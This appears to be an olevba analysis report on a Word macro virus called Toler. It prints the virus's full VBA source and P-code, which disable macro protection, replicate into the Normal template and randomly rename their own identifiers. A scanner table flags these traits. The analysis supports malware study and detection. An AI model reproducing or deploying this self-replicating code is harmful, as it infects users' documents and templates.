olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toler
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Toler - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Tolerance!
Private Type AeaZ
  DpkigbZ As Integer
  DrvlZ As Integer
  QoijZ As Boolean
End Type

Private Sub Document_Close()

End Sub

Private Sub Document_New()

End Sub

Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim AsbyieZ As Object, JshshjsvZ As Object
  Set AsbyieZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set JshshjsvZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim NudZ As AeaZ, EgacsZ As AeaZ: NudZ = WflwZ(AsbyieZ): EgacsZ = WflwZ(JshshjsvZ)
  If EgacsZ.DrvlZ = 0 Then
     FewpZ AsbyieZ, JshshjsvZ, NudZ, EgacsZ
     Options.SaveNormalPrompt = False
  End If
  If (NudZ.DrvlZ = 0) Or ((EgacsZ.DrvlZ <> 0) And (NudZ.DrvlZ <> EgacsZ.DrvlZ)) Then
     FewpZ JshshjsvZ, AsbyieZ, EgacsZ, NudZ
     
     





 
                                       
  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub FewpZ(DpkigbZ As Object, XypmZ As Object, FromP As AeaZ, ToP As AeaZ)
  Dim FgoyZ As String, MemyZ
  FgoyZ = DpkigbZ.Lines(FromP.DpkigbZ, FromP.DrvlZ)
  MemyZ = Array("XfkqZ", "AeaZ", "DpkigbZ", "XypmZ", "EaqayjZ", "DrvlZ", "QoijZ", "AsbyieZ", "JshshjsvZ", "NudZ", "EgacsZ", "FewpZ", "FgoyZ", "IqmbZ", "UedxnoZ", "UvubZ", "WflwZ", "HwvcxZ", "MemyZ")
  For i = 0 To 18: HwvcxZ FgoyZ, (MemyZ(i)), XfkqZ(FgoyZ): Next i
  If ToP.QoijZ Then XypmZ.DeleteLines 1, XypmZ.CountOfLines
  XypmZ.AddFromString FgoyZ
End Sub
Private Function XfkqZ(FgoyZ As String) As String
  Dim IqmbZ As String: IqmbZ = ""
  While (InStr(FgoyZ, IqmbZ) <> 0) Or (Len(IqmbZ) < 3)
     IqmbZ = ""
     For i = 1 To 10
         If Rnd > 0.5 Then
            If Len(IqmbZ) = 0 Then
                  IqmbZ = IqmbZ + Chr(Int(Rnd * 25 + 65))
            Else: IqmbZ = IqmbZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next i
     IqmbZ = IqmbZ + "Z"
  Wend
  XfkqZ = IqmbZ
End Function
Private Sub HwvcxZ(FgoyZ As String, UedxnoZ As String, UvubZ As String)
  Dim i As Long
  i = 1
  While InStr(i, FgoyZ, UedxnoZ) <> 0
        i = InStr(i, FgoyZ, UedxnoZ)
        FgoyZ = Left(FgoyZ, i - 1) + UvubZ + Mid$(FgoyZ, i + Len(UedxnoZ))
        Index = Index + 1
  Wend
End Sub
Private Function WflwZ(EaqayjZ As Object) As AeaZ
  WflwZ.DpkigbZ = 0
  WflwZ.DrvlZ = 0
  WflwZ.QoijZ = False
  For i = 1 To EaqayjZ.CountOfLines
   If EaqayjZ.Lines(i, 1) = "' Tolerance!" Then WflwZ.DpkigbZ = i
   If EaqayjZ.Lines(i, 1) = "End Function 'Tolerance!" Then WflwZ.DrvlZ = i - WflwZ.DpkigbZ + 1
   If InStr(EaqayjZ.Lines(i, 1), "Private Sub Document_Open()") = 1 Then WflwZ.QoijZ = True
  Next i
End Function 'Tolerance!
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Toler
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10993 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000B " Tolerance!"
' Line #1:
' 	Type (Private) AeaZ
' Line #2:
' 	DimImplicit 
' 	VarDefn DpkigbZ (As Integer)
' Line #3:
' 	DimImplicit 
' 	VarDefn DrvlZ (As Integer)
' Line #4:
' 	DimImplicit 
' 	VarDefn QoijZ (As Boolean)
' Line #5:
' 	EndType 
' Line #6:
' Line #7:
' 	FuncDefn (Private Sub Document_Close())
' Line #8:
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Private Sub Document_New())
' Line #12:
' Line #13:
' 	EndSub 
' Line #14:
' Line #15:
' 	FuncDefn (Private Sub Document_Open())
' Line #16:
' 	ArgsCall Read 0x0000 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #18:
' 	Dim 
' 	VarDefn AsbyieZ (As Object)
' 	VarDefn JshshjsvZ (As Object)
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set AsbyieZ 
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set JshshjsvZ 
' Line #21:
' 	Dim 
' 	VarDefn NudZ (As AeaZ)
' 	VarDefn EgacsZ (As AeaZ)
' 	BoS 0x0000 
' 	Ld AsbyieZ 
' 	ArgsLd WflwZ 0x0001 
' 	St NudZ 
' 	BoS 0x0000 
' 	Ld JshshjsvZ 
' 	ArgsLd WflwZ 0x0001 
' 	St EgacsZ 
' Line #22:
' 	Ld EgacsZ 
' 	MemLd DrvlZ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #23:
' 	Ld AsbyieZ 
' 	Ld JshshjsvZ 
' 	Ld NudZ 
' 	Ld EgacsZ 
' 	ArgsCall FewpZ 0x0004 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld NudZ 
' 	MemLd DrvlZ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld EgacsZ 
' 	MemLd DrvlZ 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld NudZ 
' 	MemLd DrvlZ 
' 	Ld EgacsZ 
' 	MemLd DrvlZ 
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #27:
' 	Ld JshshjsvZ 
' 	Ld AsbyieZ 
' 	Ld EgacsZ 
' 	Ld NudZ 
' 	ArgsCall FewpZ 0x0004 
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	ElseIfBlock 
' Line #38:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	ArgsMemCall InsertParagraphBefore 0x0000 
' Line #39:
' 	LitStr 0x0010 "MUD Forever! :-)"
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Private Sub FewpZ(DpkigbZ As Object, XypmZ As Object, FromP As , ToP As ))
' Line #44:
' 	Dim 
' 	VarDefn FgoyZ (As String)
' 	VarDefn MemyZ
' Line #45:
' 	Ld FromP 
' 	MemLd DpkigbZ 
' 	Ld FromP 
' 	MemLd DrvlZ 
' 	Ld DpkigbZ 
' 	ArgsMemLd Lines 0x0002 
' 	St FgoyZ 
' Line #46:
' 	LitStr 0x0005 "XfkqZ"
' 	LitStr 0x0004 "AeaZ"
' 	LitStr 0x0007 "DpkigbZ"
' 	LitStr 0x0005 "XypmZ"
' 	LitStr 0x0007 "EaqayjZ"
' 	LitStr 0x0005 "DrvlZ"
' 	LitStr 0x0005 "QoijZ"
' 	LitStr 0x0007 "AsbyieZ"
' 	LitStr 0x0009 "JshshjsvZ"
' 	LitStr 0x0004 "NudZ"
' 	LitStr 0x0006 "EgacsZ"
' 	LitStr 0x0005 "FewpZ"
' 	LitStr 0x0005 "FgoyZ"
' 	LitStr 0x0005 "IqmbZ"
' 	LitStr 0x0007 "UedxnoZ"
' 	LitStr 0x0005 "UvubZ"
' 	LitStr 0x0005 "WflwZ"
' 	LitStr 0x0006 "HwvcxZ"
' 	LitStr 0x0005 "MemyZ"
' 	ArgsArray Array 0x0013 
' 	St MemyZ 
' Line #47:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0012 
' 	For 
' 	BoS 0x0000 
' 	Ld FgoyZ 
' 	Ld i 
' 	ArgsLd MemyZ 0x0001 
' 	Paren 
' 	Ld FgoyZ 
' 	ArgsLd XfkqZ 0x0001 
' 	ArgsCall HwvcxZ 0x0003 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	Ld ToP 
' 	MemLd QoijZ 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld XypmZ 
' 	MemLd CountOfLines 
' 	Ld XypmZ 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #49:
' 	Ld FgoyZ 
' 	Ld XypmZ 
' 	ArgsMemCall AddFromString 0x0001 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Private Function XfkqZ(FgoyZ As String, id_FFFE As String) As String)
' Line #52:
' 	Dim 
' 	VarDefn IqmbZ (As String)
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St IqmbZ 
' Line #53:
' 	Ld FgoyZ 
' 	Ld IqmbZ 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld IqmbZ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Lt 
' 	Paren 
' 	Or 
' 	While 
' Line #54:
' 	LitStr 0x0000 ""
' 	St IqmbZ 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #56:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #57:
' 	Ld IqmbZ 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #58:
' 	Ld IqmbZ 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St IqmbZ 
' Line #59:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld IqmbZ 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St IqmbZ 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	Ld IqmbZ 
' 	LitStr 0x0001 "Z"
' 	Add 
' 	St IqmbZ 
' Line #64:
' 	Wend 
' Line #65:
' 	Ld IqmbZ 
' 	St XfkqZ 
' Line #66:
' 	EndFunc 
' Line #67:
' 	FuncDefn (Private Sub HwvcxZ(FgoyZ As String, UedxnoZ As String, UvubZ As String))
' Line #68:
' 	Dim 
' 	VarDefn i (As Long)
' Line #69:
' 	LitDI2 0x0001 
' 	St i 
' Line #70:
' 	Ld i 
' 	Ld FgoyZ 
' 	Ld UedxnoZ 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	While 
' Line #71:
' 	Ld i 
' 	Ld FgoyZ 
' 	Ld UedxnoZ 
' 	FnInStr3 
' 	St i 
' Line #72:
' 	Ld FgoyZ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld UvubZ 
' 	Add 
' 	Ld FgoyZ 
' 	Ld i 
' 	Ld UedxnoZ 
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	Add 
' 	St FgoyZ 
' Line #73:
' 	Ld Index 
' 	LitDI2 0x0001 
' 	Add 
' 	St Index 
' Line #74:
' 	Wend 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Private Function WflwZ(EaqayjZ As Object, id_FFFE As ) As <crash>)
' Line #77:
' 	LitDI2 0x0000 
' 	Ld WflwZ 
' 	MemSt DpkigbZ 
' Line #78:
' 	LitDI2 0x0000 
' 	Ld WflwZ 
' 	MemSt DrvlZ 
' Line #79:
' 	LitVarSpecial (False)
' 	Ld WflwZ 
' 	MemSt QoijZ 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld EaqayjZ 
' 	MemLd CountOfLines 
' 	For 
' Line #81:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld EaqayjZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "' Tolerance!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	Ld WflwZ 
' 	MemSt DpkigbZ 
' 	EndIf 
' Line #82:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld EaqayjZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0018 "End Function 'Tolerance!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	Ld WflwZ 
' 	MemLd DpkigbZ 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld WflwZ 
' 	MemSt DrvlZ 
' 	EndIf 
' Line #83:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld EaqayjZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld WflwZ 
' 	MemSt QoijZ 
' 	EndIf 
' Line #84:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #85:
' 	EndFunc 
' 	QuoteRem 0x000D 0x000A "Tolerance!"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

